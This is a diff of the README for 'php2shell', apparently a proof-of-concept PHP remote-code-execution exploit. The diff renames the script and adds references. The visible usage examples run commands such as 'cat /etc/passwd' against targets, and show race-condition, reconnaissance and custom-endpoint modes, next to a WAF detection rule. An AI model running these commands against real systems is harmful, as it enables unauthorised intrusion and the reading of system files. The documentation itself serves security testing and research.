@@ -49,18 +49,18 @@ usage: php2shell.py [-h] -t TARGET [-c CMD | --shell | --check]
 #### Single Command
 
 ```bash
-python3 exploit/php2shell.py -t http://localhost:8080 -c "cat /etc/passwd"
+python3 php2shell/poc.py -t http://localhost:8080 -c "cat /etc/passwd"
 ```
 
 #### Batch Execution
 
 ```bash
 # Inline commands
-python3 exploit/php2shell.py -t http://localhost:8080 \
+python3 php2shell/poc.py -t http://localhost:8080 \
   --cmds "id" "whoami" "uname -a" "cat /etc/os-release"
 
 # From file
-python3 exploit/php2shell.py -t http://localhost:8080 --cmd-file recon.txt
+python3 php2shell/poc.py -t http://localhost:8080 --cmd-file recon.txt
 ```
 
 #### Race Condition Mode
@@ -68,21 +68,21 @@ python3 exploit/php2shell.py -t http://localhost:8080 --cmd-file recon.txt
 When `session.upload_progress.cleanup = On` (default), PHP deletes progress data from the session file immediately after the upload completes. The `--race` flag fires concurrent injection and LFI requests to read the session file before cleanup:
 
 ```bash
-python3 exploit/php2shell.py -t http://localhost:8080 \
+python3 php2shell/poc.py -t http://localhost:8080 \
   --race --threads 20 --attempts 500 -c "id"
 ```
 
 #### Reconnaissance Only
 
 ```bash
-python3 exploit/php2shell.py -t https://target.example.com --check
-python3 exploit/php2shell.py -t https://target.example.com --check --json
+python3 php2shell/poc.py -t https://target.example.com --check
+python3 php2shell/poc.py -t https://target.example.com --check --json
 ```
 
 #### Proxy Support (Burp Suite)
 
 ```bash
-python3 exploit/php2shell.py -t http://localhost:8080 -c "id" \
+python3 php2shell/poc.py -t http://localhost:8080 -c "id" \
   --proxy http://127.0.0.1:8081
 ```
 
@@ -91,7 +91,7 @@ python3 exploit/php2shell.py -t http://localhost:8080 -c "id" \
 For targets where the LFI and upload endpoints differ from the lab defaults:
 
 ```bash
-python3 exploit/php2shell.py -t https://target.example.com \
+python3 php2shell/poc.py -t https://target.example.com \
   --inject-endpoint "/contact.php" \
   --lfi-endpoint "/page.php" \
   --session-path "/tmp" \
@@ -159,7 +159,9 @@ SecRule ARGS:PHP_SESSION_UPLOAD_PROGRESS "@contains <?php" \
 ## References
 
 - [Sansec — Critical PHP RCE: php2shell](https://sansec.io/research/php2shell)
+- [History of php2shell - Calif.io](https://calif.io/php2shell/#patch-the-planet)
 - [watchTowr — PHP RCE FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
+- [Wiz PhP2SHELL RCE](https://www.wiz.io/blog/php2shell-php-rce)
 - [Huntress — php2shell Analysis](https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities)
 - [Lilting — Session Upload Progress UAF](https://lilting.ch/en/articles/php2shell-session-upload-progress-uaf)
 - [Aikido — Critical PHP Vulnerabilities](https://www.aikido.dev/blog/critical-vulnerabilities-in-php-php2shell)
